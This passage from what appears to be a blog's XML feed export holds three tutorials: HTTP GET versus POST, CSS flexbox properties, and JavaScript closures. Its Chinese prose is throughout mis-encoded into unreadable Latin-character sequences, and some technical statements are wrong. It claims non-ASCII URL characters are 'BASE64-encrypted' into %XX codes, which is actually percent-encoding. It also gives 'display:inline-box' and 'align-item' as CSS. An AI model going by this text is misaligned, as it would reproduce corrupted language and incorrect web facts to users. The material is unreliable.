ã€‚ç„¶åŽè§£æžæ¯ä¸€ä¸ªå“åº”å¤´ï¼Œå“åº”å¤´å‘ŠçŸ¥ä»¥ä¸‹ä¸ºè‹¥å¹²å­—èŠ‚çš„HTMLæ–‡æ¡£å’Œæ–‡æ¡£çš„å­—ç¬¦é›†ã€‚å®¢æˆ·ç«¯æµè§ˆå™¨è¯»å–å“åº”æ•°æ®HTMLï¼Œæ ¹æ®HTMLçš„è¯­æ³•å¯¹å…¶è¿›è¡Œæ ¼å¼åŒ–ï¼Œå¹¶åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºã€‚ ä¾‹å¦‚ï¼šåœ¨æµè§ˆå™¨åœ°å€æ é”®å…¥URLï¼ŒæŒ‰ä¸‹å›žè½¦ä¹‹åŽä¼šç»åŽ†ä»¥ä¸‹æµç¨‹ï¼š 1ã€æµè§ˆå™¨å‘ DNS æœåŠ¡å™¨è¯·æ±‚è§£æžè¯¥ URL ä¸­çš„åŸŸåæ‰€å¯¹åº”çš„ IP åœ°å€; 2ã€è§£æžå‡º IP åœ°å€åŽï¼Œæ ¹æ®è¯¥ IP åœ°å€å’Œé»˜è®¤ç«¯å£ 80ï¼Œå’ŒæœåŠ¡å™¨å»ºç«‹TCPè¿žæŽ¥; 3ã€æµè§ˆå™¨å‘å‡ºè¯»å–æ–‡ä»¶(URL ä¸­åŸŸååŽé¢éƒ¨åˆ†å¯¹åº”çš„æ–‡ä»¶)çš„HTTP è¯·æ±‚ï¼Œè¯¥è¯·æ±‚æŠ¥æ–‡ä½œä¸º TCP ä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸‰ä¸ªæŠ¥æ–‡çš„æ•°æ®å‘é€ç»™æœåŠ¡å™¨; 4ã€æœåŠ¡å™¨å¯¹æµè§ˆå™¨è¯·æ±‚ä½œå‡ºå“åº”ï¼Œå¹¶æŠŠå¯¹åº”çš„ html æ–‡æœ¬å‘é€ç»™æµè§ˆå™¨; 5ã€é‡Šæ”¾ TCPè¿žæŽ¥; 6ã€æµè§ˆå™¨å°†è¯¥ html æ–‡æœ¬å¹¶æ˜¾ç¤ºå†…å®¹; GETå’ŒPOSTè¯·æ±‚çš„åŒºåˆ«GETè¯·æ±‚GET /books/?sex=man&amp;name=Professional HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Connection: Keep-Aliveæ³¨æ„æœ€åŽä¸€è¡Œæ˜¯ç©ºè¡Œ POSTè¯·æ±‚POST / HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley1ã€GETæäº¤ï¼Œè¯·æ±‚çš„æ•°æ®ä¼šé™„åœ¨URLä¹‹åŽï¼ˆå°±æ˜¯æŠŠæ•°æ®æ”¾ç½®åœ¨HTTPåè®®å¤´ä¸­ï¼‰ï¼Œä»¥?åˆ†å‰²URLå’Œä¼ è¾“æ•°æ®ï¼Œå¤šä¸ªå‚æ•°ç”¨&amp;è¿žæŽ¥ï¼›ä¾‹ å¦‚ï¼šlogin.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BDã€‚å¦‚æžœæ•°æ®æ˜¯è‹±æ–‡å­—æ¯/æ•°å­—ï¼ŒåŽŸæ ·å‘é€ï¼Œå¦‚æžœæ˜¯ç©ºæ ¼ï¼Œè½¬æ¢ä¸º+ï¼Œå¦‚æžœæ˜¯ä¸­æ–‡/å…¶ä»–å­—ç¬¦ï¼Œåˆ™ç›´æŽ¥æŠŠå­—ç¬¦ä¸²ç”¨BASE64åŠ å¯†ï¼Œå¾—å‡ºå¦‚ï¼š %E4%BD%A0%E5%A5%BDï¼Œå…¶ä¸­ï¼…XXä¸­çš„XXä¸ºè¯¥ç¬¦å·ä»¥16è¿›åˆ¶è¡¨ç¤ºçš„ASCIIã€‚ POSTæäº¤ï¼šæŠŠæäº¤çš„æ•°æ®æ”¾ç½®åœ¨æ˜¯HTTPåŒ…çš„åŒ…ä½“ä¸­ã€‚ä¸Šæ–‡ç¤ºä¾‹ä¸­å¼ºè°ƒæ ‡æ˜Žçš„å°±æ˜¯å®žé™…çš„ä¼ è¾“æ•°æ®å› æ­¤ï¼ŒGETæäº¤çš„æ•°æ®ä¼šåœ¨åœ°å€æ ä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œè€ŒPOSTæäº¤ï¼Œåœ°å€æ ä¸ä¼šæ”¹å˜ 2ã€ä¼ è¾“æ•°æ®çš„å¤§å°ï¼šé¦–å…ˆå£°æ˜Žï¼šHTTPåè®®æ²¡æœ‰å¯¹ä¼ è¾“çš„æ•°æ®å¤§å°è¿›è¡Œé™åˆ¶ï¼ŒHTTPåè®®è§„èŒƒä¹Ÿæ²¡æœ‰å¯¹URLé•¿åº¦è¿›è¡Œé™åˆ¶ã€‚è€Œåœ¨å®žé™…å¼€å‘ä¸­å­˜åœ¨çš„é™åˆ¶ä¸»è¦æœ‰ï¼šGET:ç‰¹å®šæµè§ˆå™¨å’ŒæœåŠ¡å™¨å¯¹URLé•¿åº¦æœ‰é™åˆ¶ï¼Œä¾‹å¦‚ IEå¯¹URLé•¿åº¦çš„é™åˆ¶æ˜¯2083å­—èŠ‚(2K+35)ã€‚å¯¹äºŽå…¶ä»–æµè§ˆå™¨ï¼Œå¦‚Netscapeã€FireFoxç­‰ï¼Œç†è®ºä¸Šæ²¡æœ‰é•¿åº¦é™åˆ¶ï¼Œå…¶é™åˆ¶å–å†³äºŽæ“ä½œç³» ç»Ÿçš„æ”¯æŒã€‚å› æ­¤å¯¹äºŽGETæäº¤æ—¶ï¼Œä¼ è¾“æ•°æ®å°±ä¼šå—åˆ°URLé•¿åº¦çš„ é™åˆ¶ã€‚POST:ç”±äºŽä¸æ˜¯é€šè¿‡URLä¼ å€¼ï¼Œç†è®ºä¸Šæ•°æ®ä¸å— é™ã€‚ä½†å®žé™…å„ä¸ªWEBæœåŠ¡å™¨ä¼šè§„å®šå¯¹postæäº¤æ•°æ®å¤§å°è¿›è¡Œé™åˆ¶ï¼ŒApacheã€IIS6éƒ½æœ‰å„è‡ªçš„é…ç½®ã€‚ 3ã€å®‰å…¨æ€§ POSTçš„å®‰å…¨æ€§è¦æ¯”GETçš„å®‰å…¨æ€§é«˜ã€‚æ¯”å¦‚ï¼šé€šè¿‡GETæäº¤æ•°æ®ï¼Œç”¨æˆ·åå’Œå¯†ç å°†æ˜Žæ–‡å‡ºçŽ°åœ¨URLä¸Šï¼Œå› ä¸º(1)ç™»å½•é¡µé¢æœ‰å¯èƒ½è¢«æµè§ˆå™¨ç¼“å­˜ï¼›(2)å…¶ä»–äººæŸ¥çœ‹æµè§ˆå™¨çš„åŽ†å²çºªå½•ï¼Œé‚£ä¹ˆåˆ«äººå°±å¯ä»¥æ‹¿åˆ°ä½ çš„è´¦å·å’Œå¯†ç äº†ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä½¿ç”¨GETæäº¤æ•°æ®è¿˜å¯èƒ½ä¼šé€ æˆCross-site request forgeryæ”»å‡» 4ã€Http get,post,soapåè®®éƒ½æ˜¯åœ¨httpä¸Šè¿è¡Œçš„ï¼ˆ1ï¼‰getï¼šè¯·æ±‚å‚æ•°æ˜¯ä½œä¸ºä¸€ä¸ªkey/valueå¯¹çš„åºåˆ—ï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰é™„åŠ åˆ°URLä¸Šçš„æŸ¥è¯¢å­—ç¬¦ä¸²çš„é•¿åº¦å—åˆ°webæµè§ˆå™¨å’ŒwebæœåŠ¡å™¨çš„é™åˆ¶ï¼ˆå¦‚IEæœ€å¤šæ”¯æŒ2048ä¸ªå­—ç¬¦ï¼‰ï¼Œä¸é€‚åˆä¼ è¾“å¤§åž‹æ•°æ®é›†åŒæ—¶ï¼Œå®ƒå¾ˆä¸å®‰å…¨ï¼ˆ2ï¼‰postï¼šè¯·æ±‚å‚æ•°æ˜¯åœ¨httpæ ‡é¢˜çš„ä¸€ä¸ªä¸åŒéƒ¨åˆ†ï¼ˆåä¸ºentity bodyï¼‰ä¼ è¾“çš„ï¼Œè¿™ä¸€éƒ¨åˆ†ç”¨æ¥ä¼ è¾“è¡¨å•ä¿¡æ¯ï¼Œå› æ­¤å¿…é¡»å°†Content-typeè®¾ç½®ä¸º:application/x-www-form- urlencodedã€‚postè®¾è®¡ç”¨æ¥æ”¯æŒwebçª—ä½“ä¸Šçš„ç”¨æˆ·å­—æ®µï¼Œå…¶å‚æ•°ä¹Ÿæ˜¯ä½œä¸ºkey/valueå¯¹ä¼ è¾“ã€‚ä½†æ˜¯ï¼šå®ƒä¸æ”¯æŒå¤æ‚æ•°æ®ç±»åž‹ï¼Œå› ä¸ºpostæ²¡æœ‰å®šä¹‰ä¼ è¾“æ•°æ®ç»“æž„çš„è¯­ä¹‰å’Œè§„åˆ™ã€‚ï¼ˆ3ï¼‰soapï¼šæ˜¯http postçš„ä¸€ä¸ªä¸“ç”¨ç‰ˆæœ¬ï¼Œéµå¾ªä¸€ç§ç‰¹æ®Šçš„xmlæ¶ˆæ¯æ ¼å¼Content-typeè®¾ç½®ä¸º: text/xml ä»»ä½•æ•°æ®éƒ½å¯ä»¥xmlåŒ–ã€‚Httpåè®®å®šä¹‰äº†å¾ˆå¤šä¸ŽæœåŠ¡å™¨äº¤äº’çš„æ–¹æ³•ï¼Œæœ€åŸºæœ¬çš„æœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯GET,POST,PUT,DELETE. ä¸€ä¸ªURLåœ°å€ç”¨äºŽæè¿°ä¸€ä¸ªç½‘ç»œä¸Šçš„èµ„æºï¼Œè€ŒHTTPä¸­çš„GET, POST, PUT, DELETEå°±å¯¹åº”ç€å¯¹è¿™ä¸ªèµ„æºçš„æŸ¥ï¼Œæ”¹ï¼Œå¢žï¼Œåˆ 4ä¸ªæ“ä½œã€‚ æˆ‘ä»¬æœ€å¸¸è§çš„å°±æ˜¯GETå’ŒPOSTäº†ã€‚GETä¸€èˆ¬ç”¨äºŽèŽ·å–/æŸ¥è¯¢èµ„æºä¿¡æ¯ï¼Œè€ŒPOSTä¸€èˆ¬ç”¨äºŽæ›´æ–°èµ„æºä¿¡æ¯. æˆ‘ä»¬çœ‹çœ‹GETå’ŒPOSTçš„åŒºåˆ« GETæäº¤çš„æ•°æ®ä¼šæ”¾åœ¨URLä¹‹åŽï¼Œä»¥?åˆ†å‰²URLå’Œä¼ è¾“æ•°æ®ï¼Œå‚æ•°ä¹‹é—´ä»¥&amp;ç›¸è¿žï¼Œå¦‚EditPosts.aspx?name=test1&amp;id=123456. POSTæ–¹æ³•æ˜¯æŠŠæäº¤çš„æ•°æ®æ”¾åœ¨HTTPåŒ…çš„Bodyä¸­.GETæäº¤çš„æ•°æ®å¤§å°æœ‰é™åˆ¶ï¼ˆå› ä¸ºæµè§ˆå™¨å¯¹URLçš„é•¿åº¦æœ‰é™åˆ¶ï¼‰ï¼Œè€ŒPOSTæ–¹æ³•æäº¤çš„æ•°æ®æ²¡æœ‰é™åˆ¶.GETæ–¹å¼éœ€è¦ä½¿ç”¨Request.QueryStringæ¥å–å¾—å˜é‡çš„å€¼ï¼Œè€ŒPOSTæ–¹å¼é€šè¿‡Request.Formæ¥èŽ·å–å˜é‡çš„å€¼ã€‚GETæ–¹å¼æäº¤æ•°æ®ï¼Œä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œé€šè¿‡GETæ–¹å¼æäº¤æ•°æ®æ—¶ï¼Œç”¨æˆ·åå’Œå¯†ç å°†å‡ºçŽ°åœ¨URLä¸Šï¼Œå¦‚æžœé¡µé¢å¯ä»¥è¢«ç¼“å­˜æˆ–è€…å…¶ä»–äººå¯ä»¥è®¿é—®è¿™å°æœºå™¨ï¼Œå°±å¯ä»¥ä»ŽåŽ†å²è®°å½•èŽ·å¾—è¯¥ç”¨æˆ·çš„è´¦å·å’Œå¯†ç .]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>httpåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flexå¸ƒå±€é‡æ¸©]]></title>
    <url>%2F2018-05-10-flexReview.html</url>
    <content type="text"><![CDATA[flexå¸ƒå±€é‡æ¸© flexå¸ƒå±€é‡æ¸©flexå¸ƒå±€é‡æ¸©ä¸€ã€Flexæ˜¯ä»€ä¹ˆFlexå¸ƒå±€æ˜¯Flexible Box çš„ç¼©å†™ã€‚æ„ä¸ºâ€œå¼¹æ€§å¸ƒå±€â€ï¼Œä¸ºç›’è£…æ¨¡åž‹æä¾›æœ€å¤§çš„çµæ´»æ€§ï¼Œä»»ä½•ä¸€ä¸ªå®¹å™¨éƒ½å¯ä»¥æŒ‡å®šä¸ºFlexå¸ƒå±€ã€‚ 123.box&#123; display:flex;&#125; è¡Œå†…å…ƒç´ ä¹Ÿå¯ä»¥ä½¿ç”¨Flexå¸ƒå±€ 123.box&#123; display:inline-box;&#125; Webkitå†…æ ¸çš„æµè§ˆå™¨ï¼Œå¿…é¡»åŠ ä¸Š -webkit å‰ç¼€ 1234.box&#123; display:-webkit-flex;/*Safair*/ display:flex;&#125; æ³¨æ„è®¾ä¸ºFlexå¸ƒå±€ä»¥åŽï¼Œå­å…ƒç´ çš„ floatã€clearã€vertical-align å±žæ€§å°†å¤±æ•ˆ äºŒã€åŸºæœ¬æ¦‚å¿µé‡‡ç”¨Flexå¸ƒå±€çš„å…ƒç´ ï¼Œç§°ä¸ºFlexå®¹å™¨ï¼ˆflex containerï¼‰,ç®€ç§°â€œå®¹å™¨â€ã€‚å®ƒçš„æ‰€æœ‰å­å…ƒç´ è‡ªåŠ¨æˆä¸ºå®¹å™¨æˆå‘˜ï¼Œç§°ä¸ºFlexé¡¹ç›®ï¼ˆflex itemï¼‰,ç®€ç§°â€œé¡¹ç›®â€ã€‚å®¹å™¨é»˜è®¤å­˜åœ¨ä¸¤æ ¹è½´ï¼šæ°´å¹³çš„ä¸»è½´ï¼ˆmain axisï¼‰å’Œåž‚ç›´çš„äº¤å‰è½´ï¼ˆcross axisï¼‰ã€‚ä¸»è½´çš„å¼€å§‹ä½ç½®ä¸Žè¾¹æ¡†çš„äº¤å‰ç‚¹å«åš main start ï¼Œç»“æŸä½ç½®å«åš main endï¼›äº¤å‰è½´çš„å¼€å§‹ä½ç½®å«åš cross start,ç»“æŸä½ç½®å«åš cross endã€‚é¡¹ç›®é»˜è®¤æ²¿ä¸»è½´æŽ’åˆ—ã€‚å•ä¸ªé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ main sizeï¼Œå æ®çš„äº¤å‰è½´ç©ºé—´å«åš cross size ä¸‰ã€å®¹å™¨çš„å±žæ€§â–¶ flex-directionâ–¶ flex-wrapâ–¶ flex-flowâ–¶ justify-contentâ–¶ align-itemsâ–¶ align-content 3.1 flex-directionå±žæ€§flex-direction å±žæ€§å†³å®šä¸»è½´çš„æ–¹å‘ï¼ˆå³é¡¹ç›®çš„æŽ’åˆ—æ–¹å‘ï¼‰ 123.box&#123; flex-direction:row | row-reverse | column | column-reverse;&#125; â–ª row: ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å·¦ç«¯â–ª row-reverse: ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å³ç«¯â–ª column : ä¸»è½´ä¸ºåž‚ç›´æ–¹å‘ï¼Œèµ·ç‚¹åœ¨ä¸Šæ²¿â–ª column-reverse : ä¸»è½´ä¸ºåž‚ç›´æ–¹å‘ï¼Œèµ·ç‚¹åœ¨ä¸‹æ²¿â–ª row: ä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å·¦ç«¯ 3.2 flex-wrapå±žæ€§é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„é¡¹ç›®éƒ½æŽ’åœ¨ä¸€æ¡çº¿ï¼ˆåˆç§°â€œè½´çº¿â€ï¼‰ä¸Šã€‚flex-wrap å±žæ€§å®šä¹‰ï¼Œå¦‚æžœä¸€æ¡è½´çº¿æŽ’ä¸ä¸‹ï¼Œå¦‚ä½•æ¢è¡Œã€‚ 123.box&#123; flex-wrap:nowrap | wrap | wrap-reverse&#125; â–ª nowrap:ä¸æ¢è¡Œâ–ª wrap:æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸Šæ–¹â–ª wrap-reverse:æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸‹æ–¹ 3.3 flex-flowflex-flow å±žæ€§æ˜¯ flex-direction å±žæ€§å’Œ flex-wrap å±žæ€§çš„ç®€å†™å½¢å¼ï¼Œé»˜è®¤å€¼ä¸º row nowrap 123.box&#123; flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;&#125; 3.4 justify-contentå±žæ€§justify-content å±žæ€§å®šä¹‰äº†é¡¹ç›®åœ¨ä¸»è½´ä¸Šçš„å¯¹é½æ–¹å¼ 123box&#123; justify-content:flex-start | flex-end | center | space-between | space-around;&#125; â–ª flex-start:å·¦å¯¹é½â–ª flex-end:å³å¯¹é½â–ª center:å±…ä¸­â–ª space-between:ä¸¤ç«¯å¯¹é½ï¼Œé¡¹ç›®ä¹‹é—´çš„é—´éš”éƒ½ç›¸ç­‰â–ª space-around:æ¯ä¸ªé¡¹ç›®ä¸¤ä¾§çš„é—´éš”ç›¸ç­‰ï¼Œæ‰€ä»¥ï¼Œé¡¹ç›®ä¹‹é—´çš„é—´éš”æ¯”é¡¹ç›®ä¸Žè¾¹æ¡†çš„é—´éš”å¤§ä¸€å€ 3.5 align-itemså±žæ€§align-itemså±žæ€§å®šä¹‰é¡¹ç›®åœ¨äº¤å‰è½´ä¸Šå¦‚ä½•å¯¹é½ 123.box&#123; align-item:flex-start | flex-end | center | baseline | stretch&#125; â–ª flex-start:äº¤å‰è½´çš„èµ·ç‚¹å¯¹é½â–ª flex-end:äº¤å‰è½´çš„ç»ˆç‚¹å¯¹é½â–ª center:äº¤å‰è½´çš„ä¸­ç‚¹å¯¹é½â–ª baseline:é¡¹ç›®çš„ç¬¬ä¸€è¡Œæ–‡å­—çš„åŸºçº¿å¯¹é½â–ª stretch:å¦‚æžœé¡¹ç›®æœªè®¾ç½®é«˜åº¦æˆ–è®¾ä¸ºautoï¼Œå°†å æ»¡æ•´ä¸ªå®¹å™¨çš„é«˜åº¦ 3.6 align-contentå±žæ€§align-content å±žæ€§å®šä¹‰äº†å¤šæ ¹è½´çº¿çš„å¯¹é½æ–¹å¼ï¼Œå¦‚æžœé¡¹ç›®åªæœ‰ä¸€æ¡è½´çº¿ï¼Œè¯¥å±žæ€§ä¸èµ·ä½œç”¨ã€‚ 123.box&#123; align-content:flex-start | flex-end | center | space-between |space-around | stretch;&#125; â–ª flex-start:äº¤å‰è½´çš„èµ·ç‚¹å¯¹é½â–ª flex-end:äº¤å‰è½´çš„ç»ˆç‚¹å¯¹é½â–ª center:äº¤å‰è½´çš„ä¸­ç‚¹å¯¹é½â–ª space-between:ä¸Žäº¤å‰è½´ä¸¤ç«¯å¯¹é½ï¼Œè½´çº¿ä¹‹é—´çš„é—´éš”å¹³å‡åˆ†å¸ƒâ–ª space-around:æ¯æ ¹è½´çº¿ä¸¤ä¾§çš„é—´éš”éƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥è½´çº¿ä¹‹é—´çš„é—´éš”æ¯”è½´çº¿ä¸Žè¾¹æ¡†çš„é—´éš”å¤§ä¸€å€â–ª stretch:è½´çº¿å æ»¡æ•´ä¸ªäº¤å‰è½´ å››ã€é¡¹ç›®çš„å±žæ€§ â–ª order:å±žæ€§å®šä¹‰é¡¹ç›®çš„æŽ’åºé¡ºåºã€‚æ•°å€¼è¶Šå°ï¼ŒæŽ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤ä¸º0â–ª flex-grow:å±žæ€§å®šä¹‰äº†é¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º0ï¼Œå³å¦‚æžœå­˜åœ¨å‰©ä½™ç©ºé—´ï¼Œä¹Ÿä¸æ”¾å¤§ï¼Œå¦‚æžœæ‰€æœ‰å±žæ€§éƒ½ä¸º1,åˆ™å¹³åˆ†æ‰€æœ‰å‰©ä½™ç©ºé—´ã€‚è‹¥æœ‰ä¸€ä¸ªä¸º2ï¼Œå…¶ä»–éƒ½ä¸º1ï¼Œåˆ™å‰è€…å æ®çš„å‰©ä½™ç©ºé—´å°†æ¯”å…¶ä»–é¡¹å¤šä¸€å€â–ª flex-shrink:å±žæ€§å®šä¹‰äº†é¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º1ï¼Œå³å¦‚æžœç©ºé—´ä¸è¶³ï¼Œè¯¥é¡¹ç›®å°†ç¼©å°â–ª flex-basis:å±žæ€§å®šä¹‰äº†åœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹é—´ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ï¼ˆmain sizeï¼‰ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±žæ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ã€‚å®ƒçš„é»˜è®¤å€¼ä¸ºautoï¼Œå³é¡¹ç›®çš„æœ¬æ¥å¤§å°ã€‚â–ª flex:flexå±žæ€§æ˜¯flex-grow , flex-shrink å’Œ flex-basis çš„ç®€å†™ï¼Œé»˜è®¤å€¼ä¸º0 1 autoã€‚åŽä¸¤ä¸ªå±žæ€§å¯é€‰ã€‚â–ª align-self: align-self å±žæ€§å…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸Žå…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œå¯è¦†ç›– align-items å±žæ€§ã€‚é»˜è®¤å€¼ä¸º auto ï¼Œè¡¨ç¤ºç»§æ‰¿çˆ¶å…ƒç´ çš„ align-items å±žæ€§ï¼Œå¦‚æžœæ²¡æœ‰çˆ¶å…ƒç´ ï¼Œåˆ™ç­‰åŒäºŽ stretchã€‚]]></content>
      <categories>
        <category>ç•Œé¢å¸ƒå±€</category>
      </categories>
      <tags>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascripté—­åŒ…]]></title>
    <url>%2F2018-05-08-deepinto-closure.html</url>
    <content type="text"><![CDATA[JavaScripté—­åŒ… é—­åŒ…å˜é‡çš„ä½œç”¨åŸŸï¼ˆ1ï¼‰è¦ç†è§£é—­åŒ…ï¼Œé¦–å…ˆå¿…é¡»ç†è§£javascriptç‰¹æ®Šçš„å˜é‡ä½œç”¨åŸŸï¼Œå˜é‡çš„ä½œç”¨æ— éžæ˜¯ä¸¤ç§ï¼šå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ï¼Œjsè¯­è¨€çš„ç‰¹æ®Šä¹‹å¤„ï¼Œå°±åœ¨äºŽå‡½æ•°å†…éƒ¨å¯ä»¥ç›´æŽ¥è¯»å–å…¨å±€å˜é‡ã€‚ 12345var n = 999;function f1()&#123; alert(n);&#125;f1(); //999 ï¼ˆ2ï¼‰å¦ä¸€æ–¹é¢ï¼Œåœ¨å‡½æ•°çš„å¤–éƒ¨æ— æ³•è¯»å–å‡½æ•°å†…éƒ¨çš„å±€éƒ¨å˜é‡ 1234function f1()&#123; var n = 999;&#125;alert(n); //error æ³¨æ„ï¼šå‡½æ•°å†…éƒ¨å£°æ˜Žå˜é‡æ—¶è¦ç”¨ varï¼Œå¦åˆ™å°±æ˜¯å…¨å±€å˜é‡ 12345function f1()&#123; n = 999;&#125;f1();alert(n); //999 å¦‚ä½•ä»Žå¤–éƒ¨è¯»å–å±€éƒ¨å˜é‡åœ¨å‡½æ•°çš„å†…éƒ¨å†å®šä¹‰ä¸€ä¸ªå‡½æ•° 123456function f1()&#123; n = 999; function f2()&#123; alert(n); //999 &#125;&#125; jsè¯­è¨€â€œé“¾å¼ä½œç”¨åŸŸâ€ç»“æž„ï¼ˆchain scopeï¼‰ï¼šå‡½æ•°f2åœ¨å‡½æ•°f1å†…éƒ¨ï¼Œè¿™æ—¶f1å†…éƒ¨æ‰€æœ‰å±€éƒ¨å˜é‡ï¼Œå¯¹äºŽf2éƒ½æ˜¯å¯è§ï¼Œåè¿‡æ¥åˆ™ä¸è¡Œã€‚å­å¯¹è±¡ä¼šä¸€çº§ä¸€çº§åœ°å‘ä¸Šå¯»æ‰¾æ‰€æœ‰çˆ¶å¯¹è±¡çš„å˜é‡ï¼Œæ‰€æœ‰å¯¹äºŽçˆ¶å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œå¯¹å­å¯¹è±¡éƒ½æ˜¯å¯è§çš„ï¼Œåä¹‹åˆ™ä¸è¡Œã€‚æ—¢ç„¶f2å¯ä»¥è¯»å–f1ä¸­çš„å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆåªè¦æŠŠf2ä½œä¸ºè¿”å›žå€¼ï¼Œå°±å¯ä»¥åœ¨f1å¤–éƒ¨è¯»å–å®ƒçš„å†…éƒ¨å˜é‡ 12345678910function f1()&#123; n = 999; function f2()&#123; alert(n); &#125; return f2;&#125;var result = f1();result(); //999 é—­åŒ…çš„æ¦‚å¿µç®€è€Œè¨€ä¹‹ï¼Œé—­åŒ…å°±æ˜¯å¯ä»¥è¯»å–å…¶ä»–å‡½æ•°å†…éƒ¨å˜é‡çš„å‡½æ•°ï¼Œæœ¬è´¨ä¸Šï¼Œé—­åŒ…å°±æ˜¯å°†å‡½æ•°å†…éƒ¨ä¸Žå‡½æ•°å¤–éƒ¨è¿žæŽ¥èµ·æ¥çš„ä¸€åº§æ¡¥æ¢ é—­åŒ…çš„ç”¨é€”ï¼ˆ1ï¼‰è¯»å–å‡½æ•°å†…éƒ¨çš„å˜é‡ï¼ˆ2ï¼‰è®©å‡½æ•°å†…éƒ¨çš„å˜é‡çš„å€¼å§‹ç»ˆä¿æŒåœ¨å†…å­˜ä¸­1234567891011121314function f1()&#123; var n = 999; nAdd = function()&#123; n+=1 &#125; function f2()&#123; alert(n); &#125; return f2;&#125;var result = f1();result(); //999nAdd();result(); //1000 å‡½æ•°f1æ˜¯f2çš„çˆ¶å‡½æ•°ï¼Œè€Œf2è¢«èµ‹äºˆäº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œè¿™å¯¼è‡´äº†f2å§‹ç»ˆåœ¨å†…å­˜ä¸­ï¼Œè€Œf2çš„å­˜åœ¨ä¾èµ–äºŽf1ï¼Œå› è€Œf1ä¹Ÿå§‹ç»ˆå­˜åœ¨äºŽå†…å­˜ä¸­ï¼Œä¸ä¼šåœ¨è°ƒç”¨ç»“æŸåŽè¢«å›žæ”¶ã€‚å¦å¤– nAdd=function(){n+=1} nAddæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚ ä½¿ç”¨é—­åŒ…çš„æ³¨æ„ç‚¹ï¼ˆ1ï¼‰å†…å­˜æ³„éœ²ï¼Œé€ æˆç½‘é¡µæ€§èƒ½ä¸‹é™ï¼Œé€€å‡ºå‡½æ•°ä¹‹å‰ï¼Œå°†ä¸ä½¿ç”¨çš„å±€éƒ¨å˜é‡éƒ½åˆ é™¤ï¼ˆ2ï¼‰é—­åŒ…ä¼šåœ¨çˆ¶å‡½æ•°å¤–éƒ¨ï¼Œæ”¹å˜çˆ¶å‡½æ•°å†…éƒ¨å˜é‡çš„å€¼ã€‚æ‰€ä»¥ï¼Œå¦‚æžœä½ æŠŠçˆ¶å‡½æ•°å½“ä½œå¯¹è±¡ï¼ˆobjectï¼‰ä½¿ç”¨ï¼ŒæŠŠé—­åŒ…å½“ä½œå®ƒçš„å…¬ç”¨æ–¹æ³•ï¼ˆPublic Methodï¼‰ï¼ŒæŠŠå†…éƒ¨å˜é‡å½“ä½œå®ƒçš„ç§æœ‰å±žæ€§ï¼ˆprivate valueï¼‰ï¼Œè¿™æ—¶ä¸€å®šè¦å°å¿ƒï¼Œä¸è¦éšä¾¿æ”¹å˜çˆ¶å‡½æ•°å†…éƒ¨å˜é‡çš„å€¼ã€‚ å…·ä½“æ¡ˆä¾‹åˆ†æž12345678910function a()&#123; var i = 0; function b()&#123; alert(++i); &#125; return b;&#125;var c = a();c(); ä»£ç ç‰¹ç‚¹ï¼š1.å‡½æ•°båµŒå¥—åœ¨å‡½æ•°aå†…éƒ¨2.å‡½æ•°aè¿”å›žå‡½æ•°bå¼•ç”¨å…³ç³»å¦‚ä¸‹å›¾ var c = a() 